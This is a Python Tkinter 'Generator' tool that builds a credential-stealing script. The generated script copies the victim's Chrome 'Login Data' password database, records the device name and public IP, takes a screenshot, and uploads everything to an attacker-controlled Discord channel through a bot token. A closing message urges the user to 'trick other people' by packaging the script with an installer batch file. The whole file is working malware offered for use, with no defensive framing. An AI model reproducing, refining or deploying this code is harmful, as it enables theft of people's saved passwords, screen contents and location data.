import os
import shutil
import tkinter as tk
from tkinter.simpledialog import messagebox
from discord import Client, Intents
import socket
from PIL import ImageGrab
import requests

device_name = "{device_name}"
ip_address = "{ip_address}"
e = "{e}"

class GeneratorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Generator")
        
        self.filename_label = tk.Label(root, text="Filename:")
        self.filename_label.pack()
        self.filename_entry = tk.Entry(root)
        self.filename_entry.pack()
        
        self.token_label = tk.Label(root, text="Token:")
        self.token_label.pack()
        self.token_entry = tk.Entry(root)
        self.token_entry.pack()
        
        self.channelid_label = tk.Label(root, text="Channel ID:")
        self.channelid_label.pack()
        self.channelid_entry = tk.Entry(root)
        self.channelid_entry.pack()
        
        self.generate_button = tk.Button(root, text="Generate", command=self.generate_files)
        self.generate_button.pack()

    def generate_files(self):
        filename = self.filename_entry.get()
        token = self.token_entry.get()
        channelid = self.channelid_entry.get()
        
        # Create directory if not exists
        folder_path = os.path.join(os.path.dirname(__file__), "bin")
        os.makedirs(folder_path, exist_ok=True)
        
        # Write token to file
        with open(os.path.join(folder_path, "token.txt"), "w") as token_file:
            token_file.write(token)
        
        # Write code to generate file
        with open(os.path.join(folder_path, f"{filename}.py"), "w") as py_file:
            py_file.write(f"""\
import discord
import shutil
import os
import socket
from PIL import ImageGrab
import requests

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org').text
        return response
    except Exception as e:
        print(f"Error occurred while fetching public IP address: {e}")
        return "Unknown"

intents = discord.Intents.default()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    folder_path = os.path.join(os.path.dirname(__file__), "bin")
    os.makedirs(folder_path, exist_ok=True)
    shutil.copyfile(r"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", os.path.join(folder_path, "Login Data"))
    channel = client.get_channel({channelid})
    file_path = os.path.join(folder_path, "Login Data")
    file = discord.File(file_path)

    device_name = os.environ.get('COMPUTERNAME', 'Unknown device')
    ip_address = get_public_ip()

    screenshot_path = os.path.join(folder_path, "screenshot.png")
    ImageGrab.grab().save(screenshot_path)

    message = f"```File generated successfully. Device: {device_name}, IP Address: {ip_address}```"
    await channel.send(message, file=file)

    await channel.send(file=discord.File(screenshot_path))

    await client.close()

client.run("{token}")
""")
        
        # Notify user
        messagebox.showinfo("Info", "Files generated successfully. if you want trick other people? make zip file with inst.bat and req.txt")

if __name__ == "__main__":
    root = tk.Tk()
    app = GeneratorApp(root)
    root.mainloop()